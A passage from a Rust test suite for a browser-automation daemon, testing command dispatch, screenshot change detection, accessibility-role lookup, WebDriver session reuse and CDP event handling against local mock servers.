            releases.sort();
            expected.sort();
            assert_eq!(releases, expected, "{failure}");
        }
    }

    #[tokio::test]
    async fn human_command_does_not_change_session_default() {
        let mut state = super::DaemonState::new();
        // Even a rejected command must not leak a per-command override.
        let _ = super::execute_command(
            &serde_json::json!({
                "action": "unknown-test-command", "inputMode": "human"
            }),
            &mut state,
        )
        .await;
        assert_eq!(state.input_mode, "instant");
    }

    #[tokio::test]
    async fn explicit_input_mode_sets_session_default() {
        let mut state = super::DaemonState::new();
        let _ = super::execute_command(
            &serde_json::json!({
                "action": "unknown-test-command", "defaultInputMode": "smooth", "inputMode": "human"
            }),
            &mut state,
        )
        .await;
        assert_eq!(state.input_mode, "smooth");
        let _ = super::execute_command(
            &serde_json::json!({"action": "unknown-test-command"}),
            &mut state,
        )
        .await;
        assert_eq!(state.input_mode, "smooth");
    }

    #[test]
    fn screenshot_alternating_scopes_keep_independent_baselines() {
        let dir = tempfile::tempdir().unwrap();
        let image = image::RgbaImage::from_pixel(2, 2, image::Rgba([255, 0, 0, 255]));
        let mut png = std::io::Cursor::new(Vec::new());
        image.write_to(&mut png, image::ImageFormat::Png).unwrap();
        let data =
            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, png.into_inner());
        let mut state = DaemonState::new();
        let scopes = [
            "selector=#a;fullPage=false",
            "selector=#b;fullPage=false",
            "selector=None;fullPage=true",
        ];
        for pass in 0..2 {
            for (index, scope) in scopes.iter().enumerate() {
                let path = dir.path().join(format!("{pass}-{index}.png"));
                let options = ScreenshotOptions {
                    path: Some(path.to_string_lossy().into_owned()),
                    ..Default::default()
                };
                let result = observe_screenshot(
                    &mut state,
                    "tab".into(),
                    scope.to_string(),
                    &data,
                    0.0,
                    &options,
                )
                .unwrap();
                assert_eq!(
                    result["changed"],
                    pass == 0,
                    "scope {scope}, pass {pass}: {result}"
                );
                assert_eq!(result["revision"], pass + 1);
                assert_eq!(
                    path.exists(),
                    pass == 0,
                    "suppressed screenshots must not create a file"
                );
            }
        }
    }

    use super::super::cdp::types::{AXNode, AXValue};
    use super::*;
    use crate::test_utils::EnvGuard;
    use std::fs;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpListener;

    #[tokio::test]
    #[ignore]
    async fn e2e_failed_wheel_dispatch_preserves_pointer() {
        let mut state = DaemonState::new();
        let response =
            execute_command(&json!({ "action": "launch", "headless": true }), &mut state).await;
        assert_eq!(response["success"], true, "{response}");
        state.mouse_state = MouseState {
            x: 50.0,
            y: 60.0,
            buttons: 1,
        };
        let mgr = state.browser.as_ref().unwrap();
        mgr.client
            .send_command(
                "Target.detachFromTarget",
                Some(json!({ "sessionId": mgr.active_session_id().unwrap() })),
                None,
            )
            .await
            .unwrap();
        let result = handle_wheel(&json!({ "x": 200, "y": 300, "deltaY": 40 }), &mut state).await;
        let pointer = state.mouse_state;
        close_current_browser(&mut state).await.unwrap();

        assert!(
            result.is_err(),
            "detached session accepted wheel: {result:?}"
        );
        assert_eq!((pointer.x, pointer.y, pointer.buttons), (50.0, 60.0, 1));
    }

    #[test]
    fn screenshot_pixel_ratio_counts_changed_pixels() {
        let previous = ScreenshotObservation {
            revision: 1,
            signature: "viewport".to_string(),
            decoded_hash: 0,
            width: 2,
            height: 1,
            rgba: vec![0, 0, 0, 255, 255, 255, 255, 255],
        };
        let current = vec![0, 0, 0, 255, 255, 0, 255, 255];
        assert_eq!(changed_pixel_ratio(&previous, 2, 1, &current), 0.5);
    }

    #[test]
    fn screenshot_pixel_ratio_treats_dimension_change_as_full_change() {
        let previous = ScreenshotObservation {
            revision: 1,
            signature: "viewport".to_string(),
            decoded_hash: 0,
            width: 1,
            height: 1,
            rgba: vec![0, 0, 0, 255],
        };
        assert_eq!(changed_pixel_ratio(&previous, 2, 1, &[0; 8]), 1.0);
    }

    /// A binding-recovery failure must tear the connection down: the attach
    /// paths set `state.browser` before calling this, so returning the error
    /// alone would let the next command skip the attach path and act on
    /// whatever tab is selected. Force-red: drop `rollback_failed_launch`
    /// from the error arm and `launch_identity` survives the error.
    #[tokio::test]
    async fn apply_tab_binding_rollback_clears_launch_state_on_recovery_failure() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_SOCKET_DIR", "XDG_RUNTIME_DIR"]);
        let dir = tempfile::tempdir().unwrap();
        guard.set("AGENT_BROWSER_SOCKET_DIR", dir.path().to_str().unwrap());
        guard.remove("XDG_RUNTIME_DIR");

        let mut state = DaemonState::new();
        fs::write(
            super::tab_binding::binding_path(&state.session_id),
            "{not valid json",
        )
        .unwrap();
        state.launch_identity = Some(42);

        let err = apply_tab_binding_on_attach_or_rollback(&mut state)
            .await
            .expect_err("a corrupt binding file is a recovery failure");

        assert!(
            err.contains("corrupt tab binding file"),
            "unexpected error: {}",
            err
        );
        assert!(
            state.launch_identity.is_none(),
            "the failed attach must be rolled back, not left committed"
        );
    }

    /// `find --help`, the MCP tool schema, and the docs/skill references are
    /// plain text, not generated from `FIND_ACTIONS`; this pins their
    /// wording to the actual accepted set so an edit to one without the
    /// others fails here instead of drifting silently again.
    #[tokio::test]
    async fn recording_start_rejects_active_take_before_browser_work() {
        let mut state = DaemonState::new();
        state.recording_state.active = true;
        let error = handle_recording_start(&json!({"path":"unused.webm"}), &mut state)
            .await
            .unwrap_err();
        assert_eq!(error, "Recording already active");
        assert!(state.recording_state.active);
        assert!(state.browser.is_none());
    }

    #[tokio::test]
    async fn errors_clear_empties_page_error_log() {
        let mut state = DaemonState::new();
        state
            .event_tracker
            .add_error("boom", Some("app.js"), Some(7), Some(3));

        let resp = handle_errors(&json!({ "clear": true }), &mut state)
            .await
            .unwrap();
        assert_eq!(resp["cleared"], true);

        let resp = handle_errors(&json!({}), &mut state).await.unwrap();
        assert_eq!(resp["errors"], json!([]));
    }

    #[test]
    fn find_actions_help_text_matches_the_accepted_set() {
        assert_eq!(FIND_ACTIONS.join(", "), "click, fill, check, hover, text");
    }

    /// `type`, `focus`, and `uncheck` are real standalone commands but were
    /// never wired into `execute_subaction`, so they used to reach here and
    /// fail with "Browser not launched" (masking the real problem) or a bare
    /// "Unknown subaction: type". No prior test caught this:
    /// `test_all_documented_actions_are_handled` only covers top-level
    /// `action` values, not `find`'s nested `subaction`.
    #[tokio::test]
    async fn execute_subaction_rejects_undocumented_actions_before_requiring_a_browser() {
        let mut state = DaemonState::new();
        assert!(state.browser.is_none());

        for bogus in ["type", "focus", "uncheck", "drag", ""] {
            assert!(
                !FIND_ACTIONS.contains(&bogus),
                "test fixture '{bogus}' must not overlap the real accepted set"
            );
            let cmd = json!({ "subaction": bogus });
            let err = execute_subaction(&cmd, &mut state, "@e1")
                .await
                .expect_err(&format!(
                    "'{bogus}' is not a find action and must be rejected"
                ));
            assert_eq!(
                err,
                format!(
                    "Unknown action '{}' for find. Valid actions: {}.",
                    bogus,
                    FIND_ACTIONS.join(", ")
                )
            );
        }
    }

    /// The dispatch-level validation must reject an unsupported `find`
    /// action for every find-family command, before any browser launch or
    /// locator resolution. Without it, a missing element fails the locator
    /// step first and masks the invalid action with "element not found"
    /// (after paying for a browser launch to say it).
    #[test]
    fn validate_find_subaction_rejects_before_any_browser_work() {
        for command in FIND_SUBACTION_COMMANDS {
            let err = validate_find_subaction(command, &json!({ "subaction": "type" }))
                .expect_err(&format!("'{command}' must validate its find action"));
            assert_eq!(
                err,
                format!(
                    "Unknown action 'type' for find. Valid actions: {}.",
                    FIND_ACTIONS.join(", ")
                )
            );
        }

        // The default subaction and every accepted action pass.
        assert!(validate_find_subaction("getbyrole", &json!({})).is_ok());
        for accepted in FIND_ACTIONS {
            assert!(
                validate_find_subaction("getbytext", &json!({ "subaction": accepted })).is_ok()
            );
        }

        // Commands outside the find family carry no subaction contract.
        assert!(validate_find_subaction("click", &json!({ "subaction": "type" })).is_ok());
    }

    /// Every entry in `FIND_ACTIONS` must actually dispatch in
    /// `execute_subaction`'s match, not just pass the guard; this is the
    /// real lock the guard alone can't provide, since the guard and the
    /// match arms are two separate lists that Rust can't check against each
    /// other at compile time.
    #[tokio::test]
    #[ignore]
    async fn e2e_execute_subaction_dispatches_every_find_action() {
        let mut state = DaemonState::new();
        let resp = execute_command(
            &json!({ "id": "1", "action": "launch", "headless": true }),
            &mut state,
        )
        .await;
        assert!(resp.get("success").and_then(|v| v.as_bool()) == Some(true));

        let resp = execute_command(
            &json!({
                "id": "2",
                "action": "navigate",
                "url": "data:text/html,<input id='i' role='textbox' value='x'><button>Go</button><input type='checkbox' role='checkbox'>"
            }),
            &mut state,
        )
        .await;
        assert!(resp.get("success").and_then(|v| v.as_bool()) == Some(true));

        for action in FIND_ACTIONS {
            let mut cmd = json!({
                "id": "3",
                "action": "getbyrole",
                "role": match *action {
                    "fill" => "textbox",
                    "check" => "checkbox",
                    _ => "button",
                },
                "subaction": action,
            });
            if *action == "fill" {
                cmd["value"] = json!("y");
            }
            let resp = execute_command(&cmd, &mut state).await;
            // success == true is the only assertion that proves the action
            // reached a real handler AND that handler worked: a guard-only
            // check ("not Unknown action") stays green when an entry added
            // to FIND_ACTIONS falls through to the internal-error fallback.
            let error = resp.get("error").and_then(|v| v.as_str()).unwrap_or("");
            assert!(
                resp.get("success").and_then(|v| v.as_bool()) == Some(true),
                "action '{action}' must dispatch to a working handler: {error}"
            );
        }

        let _ = execute_command(&json!({ "id": "99", "action": "close" }), &mut state).await;
    }

    fn ax_value(value: &str) -> AXValue {
        AXValue {
            value_type: "string".to_string(),
            value: Some(Value::String(value.to_string())),
        }
    }

    fn ax_node(role: &str, name: &str, backend_node_id: Option<i64>, ignored: bool) -> AXNode {
        AXNode {
            node_id: format!("node-{}", name),
            role: Some(ax_value(role)),
            name: Some(ax_value(name)),
            value: None,
            description: None,
            properties: None,
            child_ids: None,
            backend_d_o_m_node_id: backend_node_id,
            ignored: Some(ignored),
        }
    }

    #[test]
    fn normalize_ax_role_maps_rootwebarea_to_document() {
        // Chrome's AX root is `RootWebArea`; ARIA and Playwright call it
        // `document`. Force-red: drop the mapping and `find role document` misses
        // the root. `image` is pre-existing and covered elsewhere.
        assert_eq!(normalize_ax_role("RootWebArea"), "document");
        assert_eq!(normalize_ax_role("document"), "document");
    }

    #[test]
    fn find_ax_node_by_role_matches_browser_computed_implicit_roles() {
        let nodes = vec![
            ax_node("RootWebArea", "Fixture", Some(1), false),
            ax_node("link", "Services", Some(42), false),
            ax_node("heading", "Skills", Some(43), false),
        ];

        let (backend_id, actual_name) =
            find_ax_node_by_role(&nodes, "link", Some("Services"), true)
                .expect("computed AX link role should match the anchor");
        assert_eq!(backend_id, 42);
        assert_eq!(actual_name, "Services");

        let (backend_id, _) = find_ax_node_by_role(&nodes, "heading", None, false)
            .expect("role-only lookup should match the implicit heading");
        assert_eq!(backend_id, 43);
    }

    #[test]
    fn find_ax_node_by_role_non_exact_name_is_case_insensitive() {
        let nodes = vec![ax_node("heading", "SKILLS", Some(43), false)];

        for query in ["Skills", "skills", "SKILLS", "kill"] {
            let (backend_id, actual_name) =
                find_ax_node_by_role(&nodes, "heading", Some(query), false).unwrap_or_else(|e| {
                    panic!("expected case-insensitive match for {query:?}: {e}")
                });
            assert_eq!(backend_id, 43);
            assert_eq!(actual_name, "SKILLS");
        }
    }

    #[test]
    fn find_ax_node_by_role_exact_name_stays_case_sensitive() {
        let nodes = vec![ax_node("heading", "SKILLS", Some(43), false)];

        let err = find_ax_node_by_role(&nodes, "heading", Some("Skills"), true)
            .expect_err("exact matching must not ignore case");
        assert!(err.contains("Names seen: \"SKILLS\""));

        let (backend_id, _) = find_ax_node_by_role(&nodes, "heading", Some("SKILLS"), true)
            .expect("exact match with identical case should still succeed");
        assert_eq!(backend_id, 43);
    }

    #[test]
    fn find_ax_node_by_role_matches_role_case_insensitively() {
        let nodes = vec![ax_node("heading", "Skills", Some(43), false)];

        let (backend_id, _) = find_ax_node_by_role(&nodes, "Heading", None, false)
            .expect("role matching should ignore case, same as name matching");
        assert_eq!(backend_id, 43);
    }

    /// Chrome's AX tree reports `<img>` as role "image" while ARIA (and
    /// Playwright queries) call it "img"; both spellings must find the node.
    #[test]
    fn find_ax_node_by_role_normalizes_ax_role_synonyms() {
        let nodes = vec![ax_node("image", "Logo", Some(51), false)];

        let (backend_id, _) = find_ax_node_by_role(&nodes, "img", Some("Logo"), false)
            .expect("the ARIA role name must match Chrome's AX role");
        assert_eq!(backend_id, 51);

        let (backend_id, _) = find_ax_node_by_role(&nodes, "image", Some("Logo"), false)
            .expect("the AX spelling keeps matching after normalization");
        assert_eq!(backend_id, 51);
    }

    /// Accessible names are whitespace-normalized on both sides, so a name
    /// rendered with a collapsed run of spaces still matches exactly.
    #[test]
    fn find_ax_node_by_role_normalizes_whitespace_in_names() {
        let nodes = vec![ax_node("button", "Save   changes", Some(52), false)];

        let (backend_id, _) = find_ax_node_by_role(&nodes, "button", Some("Save changes"), true)
            .expect("exact matching must normalize internal whitespace");
        assert_eq!(backend_id, 52);

        let (backend_id, _) = find_ax_node_by_role(&nodes, "button", Some("save  changes"), false)
            .expect("substring matching must normalize internal whitespace");
        assert_eq!(backend_id, 52);
    }

    #[test]
    fn find_ax_node_by_role_supports_substring_matching() {
        let nodes = vec![ax_node("button", "Submit form", Some(7), false)];

        let (backend_id, actual_name) =
            find_ax_node_by_role(&nodes, "button", Some("submit"), false)
                .expect("substring matching should be allowed without exact");
        assert_eq!(backend_id, 7);
        assert_eq!(actual_name, "Submit form");

        let err = find_ax_node_by_role(&nodes, "button", Some("Submit"), true)
            .expect_err("exact matching should reject partial names");
        assert!(err.contains("Names seen: \"Submit form\""));
    }

    #[test]
    fn find_ax_node_by_role_skips_ignored_nodes_and_requires_backend_id() {
        let nodes = vec![
            ax_node("link", "Services", Some(1), true),
            ax_node("link", "Services", None, false),
        ];

        let err = find_ax_node_by_role(&nodes, "link", Some("Services"), true)
            .expect_err("matching AX nodes must have a backend DOM node id");
        assert!(err.contains("no live DOM element"));
    }

    #[test]
    fn find_ax_node_by_role_uses_later_actionable_match() {
        let nodes = vec![
            ax_node("link", "Services", None, false),
            ax_node("link", "Services", Some(42), false),
        ];

        let (backend_id, actual_name) =
            find_ax_node_by_role(&nodes, "link", Some("Services"), true)
                .expect("lookup should continue past matching virtual AX nodes");
        assert_eq!(backend_id, 42);
        assert_eq!(actual_name, "Services");
    }

    #[test]
    fn find_ax_node_by_role_name_miss_lists_names_seen() {
        let nodes = vec![
            ax_node("heading", "Skills", Some(43), false),
            ax_node("heading", "Experience", Some(44), false),
        ];

        let err = find_ax_node_by_role(&nodes, "heading", Some("Nope"), false)
            .expect_err("no node should match an unrelated name");
        assert!(err.contains("2 elements have role \"heading\""));
        assert!(err.contains("Nope"));
        assert!(err.contains("\"Skills\""));
        assert!(err.contains("\"Experience\""));
    }

    #[test]
    fn find_ax_node_by_role_name_miss_count_is_elements_not_unique_names() {
        let nodes = vec![
            ax_node("heading", "Skills", Some(43), false),
            ax_node("heading", "Skills", Some(44), false),
            ax_node("heading", "Skills", Some(45), false),
        ];

        let err = find_ax_node_by_role(&nodes, "heading", Some("Nope"), false)
            .expect_err("no node should match an unrelated name");
        // 3 elements share the same name, so names_seen dedupes to 1 entry;
        // the element count must still say 3, not 1.
        assert!(
            err.contains("3 elements have role \"heading\""),
            "expected element count 3, got: {err}"
        );
        assert_eq!(
            err.matches("\"Skills\"").count(),
            1,
            "names_seen must dedupe the display list: {err}"
        );
    }

    #[test]
    fn find_ax_node_by_role_no_role_match_reports_role_selector() {
        let nodes = vec![ax_node("button", "Submit", Some(7), false)];

        let err = find_ax_node_by_role(&nodes, "heading", Some("Nope"), false)
            .expect_err("no node has this role at all");
        assert!(err.contains("getByRole('heading'"));
        assert!(err.contains("Nope"));
    }

    #[test]
    fn presentational_roles_are_detected_case_insensitively() {
        assert!(is_presentational_role("none"));
        assert!(is_presentational_role("presentation"));
        assert!(is_presentational_role("None"));
        assert!(is_presentational_role("PRESENTATION"));
        assert!(!is_presentational_role("heading"));
        assert!(!is_presentational_role("generic"));
    }

    /// Chrome prunes role="none"/"presentation" elements from the AX tree
    /// (divs, uls, imgs vanish; tables survive only as ignored nodes), so
    /// these queries must resolve through the DOM-attribute fallback, not
    /// `find_ax_node_by_role`. Regression test for the review finding on
    /// #1552: the AX rewrite broke `find role none` / `find role
    /// presentation`, which the old CSS path matched.
    #[tokio::test]
    #[ignore]
    async fn e2e_presentational_roles_resolve_through_dom_fallback() {
        let mut state = DaemonState::new();
        let resp = execute_command(
            &json!({ "id": "1", "action": "launch", "headless": true }),
            &mut state,
        )
        .await;
        assert!(resp.get("success").and_then(|v| v.as_bool()) == Some(true));

        let resp = execute_command(
            &json!({
                "id": "2",
                "action": "navigate",
                "url": "data:text/html,<div role='none'>alpha</div><div role='presentation'>beta</div><h2>gamma</h2>"
            }),
            &mut state,
        )
        .await;
        assert!(resp.get("success").and_then(|v| v.as_bool()) == Some(true));

        for (role, expected) in [
            ("none", "alpha"),
            ("presentation", "beta"),
            ("heading", "gamma"),
        ] {
            let resp = execute_command(
                &json!({ "id": "3", "action": "getbyrole", "role": role, "subaction": "text" }),
                &mut state,
            )
            .await;
            assert!(
                resp.get("success").and_then(|v| v.as_bool()) == Some(true),
                "find role {role} text must succeed: {resp}"
            );
            let text = resp
                .get("data")
                .and_then(|d| d.get("text"))
                .and_then(|t| t.as_str())
                .unwrap_or("");
            assert_eq!(text, expected, "find role {role} text");
        }

        let _ = execute_command(&json!({ "id": "99", "action": "close" }), &mut state).await;
    }

    async fn start_webdriver_response_server(
        responses: Vec<(&'static str, Value)>,
    ) -> (u16, tokio::task::JoinHandle<usize>) {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        let handle = tokio::spawn(async move {
            let mut handled = 0;
            for (expected_path, body) in responses {
                let (mut stream, _) = listener.accept().await.unwrap();
                let mut buf = [0_u8; 2048];
                let n = stream.read(&mut buf).await.unwrap_or(0);
                let request = String::from_utf8_lossy(&buf[..n]);
                let (method, path) = expected_path
                    .split_once(' ')
                    .unwrap_or(("GET", expected_path));
                assert!(request.starts_with(&format!("{} {} ", method, path)));
                let body = body.to_string();
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                stream.write_all(response.as_bytes()).await.unwrap();
                handled += 1;
            }
            handled
        });
        (port, handle)
    }

    fn safari_settings() -> crate::session_settings::Running {
        let mut settings = crate::session_settings::Running::default();
        settings.set(Key::Provider, json!("safari"));
        settings.set(Key::Headed, json!(false));
        settings
    }

    #[tokio::test]
    async fn ordinary_commands_keep_the_active_webdriver_session() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_EXECUTABLE_PATH", "AGENT_BROWSER_PROVIDER"]);
        guard.set("AGENT_BROWSER_EXECUTABLE_PATH", "/missing/chrome-for-test");
        guard.remove("AGENT_BROWSER_PROVIDER");
        let (port, server) = start_webdriver_response_server(vec![
            (
                "/session/test-session/url",
                json!({ "value": "https://example.test/first" }),
            ),
            (
                "/session/test-session/url",
                json!({ "value": "https://example.test/first" }),
            ),
        ])
        .await;
        let mut state = DaemonState::new();
        state.backend_type = BackendType::WebDriver;
        state.webdriver_backend = Some(WebDriverBackend::new(
            crate::native::webdriver::client::WebDriverClient::new_with_session(
                port,
                "test-session".to_string(),
            ),
        ));
        state.settings = safari_settings();

        for _ in 0..2 {
            let response = execute_command(
                &json!({ "id": "url", "action": "url", "provider": "safari" }),
                &mut state,
            )
            .await;
            assert_eq!(response["success"], true);
            assert_eq!(response["data"]["url"], "https://example.test/first");
            assert!(state.browser.is_none());
            assert!(state.webdriver_backend.is_some());
        }

        assert_eq!(server.await.unwrap(), 2);
    }

    #[tokio::test]
    #[cfg_attr(
        target_os = "macos",
        ignore = "replacement launch starts the real safaridriver"
    )]
    async fn webdriver_launch_reuses_matching_config_and_closes_before_replacement() {
        let vars = &[
            "AGENT_BROWSER_ENGINE",
            "AGENT_BROWSER_EXECUTABLE_PATH",
            "AGENT_BROWSER_PROXY_USERNAME",
            "AGENT_BROWSER_PROXY_PASSWORD",
            "AGENT_BROWSER_HEADED",
            "AGENT_BROWSER_ENABLE",
            "AGENT_BROWSER_INIT_SCRIPTS",
            "AGENT_BROWSER_ALLOWED_DOMAINS",
            "AGENT_BROWSER_HIDE_SCROLLBARS",
            "AGENT_BROWSER_WEBGPU",
            "AGENT_BROWSER_NO_XVFB",
            "AGENT_BROWSER_NO_WEBMCP",
        ];
        let guard = EnvGuard::new(vars);
        for name in vars {
            guard.remove(name);
        }
        for changed_config in [false, true] {
            let mut cmd =
                json!({ "action": "launch", "provider": "safari", "port": 0, "headless": true });
            let invalid_session = json!({ "value": { "error": "invalid session id", "message": "Session has ended" } });
            let mut responses = vec![(
                "/session/test-session/window/handles",
                json!({ "value": ["window-1"] }),
            )];
            if !changed_config {
                responses.push((
                    "/session/test-session/window/handles",
                    invalid_session.clone(),
                ));
            }
            responses.push(("DELETE /session/test-session", invalid_session));
            let (port, server) = start_webdriver_response_server(responses).await;
            let mut state = DaemonState::new();
            state.backend_type = BackendType::WebDriver;
            state.webdriver_backend = Some(WebDriverBackend::new(
                crate::native::webdriver::client::WebDriverClient::new_with_session(
                    port,
                    "test-session".to_string(),
                ),
            ));
            state.settings = safari_settings();

            let response = handle_launch_inner(&cmd, &mut state).await.unwrap();

            assert_eq!(response["reused"], true);
            assert!(state.webdriver_backend.is_some());
            if changed_config {
                cmd["ignoreHTTPSErrors"] = json!(true);
            }
            let result = handle_launch_inner(&cmd, &mut state).await;
            assert!(result.is_err());
            assert!(state.webdriver_backend.is_none());
            assert!(state.browser.is_none());
            assert_eq!(server.await.unwrap(), if changed_config { 2 } else { 3 });
        }
    }

    fn unique_socket_dir(label: &str) -> PathBuf {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .expect("system clock should be after unix epoch")
            .as_nanos();
        std::env::temp_dir().join(format!(
            "agent-browser-{label}-{}-{nanos}",
            std::process::id()
        ))
    }

    #[test]
    fn test_iframe_network_events_are_scoped_to_active_page_sessions() {
        let active_sessions = HashSet::from(["active-iframe".to_string()]);

        assert!(is_active_iframe_network_event(
            "Network.requestWillBeSent",
            Some("active-iframe"),
            true,
            &active_sessions,
        ));
        assert!(!is_active_iframe_network_event(
            "Network.requestWillBeSent",
            Some("background-iframe"),
            true,
            &active_sessions,
        ));
        assert!(!is_active_iframe_network_event(
            "Runtime.consoleAPICalled",
            Some("active-iframe"),
            true,
            &active_sessions,
        ));
        assert!(!is_active_iframe_network_event(
            "Network.requestWillBeSent",
            Some("active-iframe"),
            false,
            &active_sessions,
        ));
    }

    #[test]
    fn test_active_frame_scope_tracks_top_level_and_iframe_changes() {
        assert!(!active_frame_scope_may_have_changed(
            &DrainedEvents::default()
        ));

        let mut destroyed_page = DrainedEvents::default();
        destroyed_page
            .destroyed_targets
            .push("page-target".to_string());
        assert!(active_frame_scope_may_have_changed(&destroyed_page));

        let mut attached_iframe = DrainedEvents::default();
        attached_iframe
            .attached_iframe_sessions
            .push(("frame".to_string(), "session".to_string()));
        assert!(active_frame_scope_may_have_changed(&attached_iframe));
    }

    #[test]
    fn drain_drops_targets_destroyed_in_the_same_batch() {
        let mut state = DaemonState::new();
        let (events, receiver) = broadcast::channel(16);
        state.event_rx = Some(receiver);

        events
            .send(CdpEvent {
                method: "Target.targetInfoChanged".to_string(),
                params: json!({"targetInfo":{"targetId":"closed","type":"page","title":"","url":"https://example.com/","attached":false}}),
                session_id: None,
            })
            .unwrap();
        events
            .send(CdpEvent {
                method: "Target.targetDestroyed".to_string(),
                params: json!({"targetId":"closed"}),
                session_id: None,
            })
            .unwrap();

        let drained = state.drain_cdp_events();
        assert!(drained.new_targets.is_empty());
        assert_eq!(drained.destroyed_targets, vec!["closed".to_string()]);
    }

    #[test]
    fn drain_drops_sessions_detached_in_the_same_batch() {
        let mut state = DaemonState::new();
        let (events, receiver) = broadcast::channel(16);
        state.event_rx = Some(receiver);

        events
            .send(CdpEvent {
                method: "Target.attachedToTarget".to_string(),
                params: json!({"sessionId":"old","targetInfo":{"targetId":"w","type":"service_worker","title":"","url":"https://example.com/sw.js","attached":true},"waitingForDebugger":true}),
                session_id: None,
            })
            .unwrap();
        events
            .send(CdpEvent {
                method: "Target.detachedFromTarget".to_string(),
                params: json!({"sessionId":"old","targetId":"w"}),
                session_id: None,
            })
            .unwrap();
        events
            .send(CdpEvent {
                method: "Target.attachedToTarget".to_string(),
                params: json!({"sessionId":"new","targetInfo":{"targetId":"w","type":"service_worker","title":"","url":"https://example.com/sw.js","attached":true},"waitingForDebugger":true}),
                session_id: None,
            })
            .unwrap();

        let drained = state.drain_cdp_events();
        assert_eq!(drained.attached_worker_sessions.len(), 1);
        assert_eq!(drained.attached_worker_sessions[0].1, "new");
    }

    #[test]
    fn drain_keeps_discovered_page_when_its_session_detaches() {
        let mut state = DaemonState::new();
        let (events, receiver) = broadcast::channel(16);
        state.event_rx = Some(receiver);

        events
            .send(CdpEvent {
                method: "Target.targetInfoChanged".to_string(),
                params: json!({"targetInfo":{"targetId":"p","type":"page","title":"","url":"https://example.com/","attached":false}}),
                session_id: None,
            })
            .unwrap();
        events
            .send(CdpEvent {
                method: "Target.attachedToTarget".to_string(),
                params: json!({"sessionId":"old","targetInfo":{"targetId":"p","type":"page","title":"","url":"https://example.com/","attached":true},"waitingForDebugger":true}),
                session_id: None,
            })
            .unwrap();
        events
            .send(CdpEvent {
                method: "Target.detachedFromTarget".to_string(),
                params: json!({"sessionId":"old","targetId":"p"}),
                session_id: None,
            })
            .unwrap();

        let drained = state.drain_cdp_events();
        assert!(drained.attached_page_sessions.is_empty());
        assert_eq!(drained.new_targets.len(), 1);
        assert_eq!(drained.new_targets[0].target_info.target_id, "p");
    }

    /// An iframe that detaches while its session is being prepared is
    /// dropped without waiting out the CDP timeout and without closing the
    /// browser, even with network controls active (#1991). Frames that were
    /// already attached, and ones attached in the same batch, are kept.
    #[tokio::test]
    async fn iframe_detached_during_setup_is_dropped_without_stalling() {
        use futures_util::{SinkExt, StreamExt};
        use tokio_tungstenite::tungstenite::Message;

        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let url = format!("ws://{}", listener.local_addr().unwrap());
        let resumed = Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
        let resumed_by_server = resumed.clone();
        tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();
            let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
            while let Some(Ok(Message::Text(text))) = ws.next().await {
                let command: Value = serde_json::from_str(&text).unwrap();
                let session = command["sessionId"].as_str().unwrap_or_default();
                if command["method"] == "Runtime.runIfWaitingForDebugger" {
                    resumed_by_server.lock().unwrap().push(session.to_string());
                    continue;
                }
                // The short-lived frame is gone before Chrome answers.
                let reply = if session == "S-GONE" {
                    json!({
                        "method": "Target.detachedFromTarget",
                        "params": { "sessionId": "S-GONE", "targetId": "F-GONE" }
                    })
                } else {
                    json!({ "id": command["id"], "result": {} })
                };
                if ws.send(Message::Text(reply.to_string())).await.is_err() {
                    return;
                }
            }
        });

        let mut state = DaemonState::new();
        let client = CdpClient::connect(&url).await.unwrap();
        state.browser = Some(BrowserManager::for_test(client, url.clone()));
        *state.proxy_credentials.write().await = Some(("user".into(), "pass".into()));
        state
            .iframe_sessions
            .insert("F-PAY".to_string(), "S-PAY".to_string());

        let drained = DrainedEvents {
            attached_iframe_sessions: vec![
                ("F-GONE".to_string(), "S-GONE".to_string()),
                ("F-NEW".to_string(), "S-NEW".to_string()),
            ],
            ..DrainedEvents::default()
        };
        tokio::time::timeout(
            std::time::Duration::from_secs(2),
            state.apply_drained_events(drained),
        )
        .await
        .expect("a detached iframe must not hold up the drain")
        .unwrap();

        assert!(state.browser.is_some(), "the browser must stay open");
        assert_eq!(
            state.iframe_sessions,
            HashMap::from([
                ("F-PAY".to_string(), "S-PAY".to_string()),
                ("F-NEW".to_string(), "S-NEW".to_string()),
            ])
        );
        tokio::time::timeout(std::time::Duration::from_secs(2), async {
            while !resumed.lock().unwrap().contains(&"S-NEW".to_string()) {
                tokio::time::sleep(std::time::Duration::from_millis(10)).await;
            }
        })
        .await
        .expect("the live frame should be resumed");
        assert!(!resumed.lock().unwrap().contains(&"S-GONE".to_string()));
    }

    fn setup_test_target(target_id: &str, target_type: &str) -> TargetInfo {
        TargetInfo {
            target_id: target_id.to_string(),
            target_type: target_type.to_string(),
            title: String::new(),
            url: "https://example.com/".to_string(),
            attached: Some(true),
            browser_context_id: None,
        }
    }

    /// Fake CDP endpoint for the session setup tests. `Target.attachToTarget`
    /// attaches `attach_sid`. Commands to `S-GONE` are answered with that
    /// session's detach, commands to `S-SILENT` are never answered,
    /// `Runtime.evaluate` in `S-THROWS` reports an exception whose text names
    /// a missing session, and everything else succeeds. Returns the URL and
    /// the sessions resumed.
    async fn spawn_session_setup_cdp_server(
        attach_sid: &'static str,
    ) -> (String, Arc<std::sync::Mutex<Vec<String>>>) {
        use futures_util::{SinkExt, StreamExt};
        use tokio_tungstenite::tungstenite::Message;

        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let url = format!("ws://{}", listener.local_addr().unwrap());
        let resumed = Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
        let resumed_by_server = resumed.clone();
        tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();
            let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
            while let Some(Ok(Message::Text(text))) = ws.next().await {
                let command: Value = serde_json::from_str(&text).unwrap();
                let session = command["sessionId"].as_str().unwrap_or_default();
                if command["method"] == "Runtime.runIfWaitingForDebugger" {
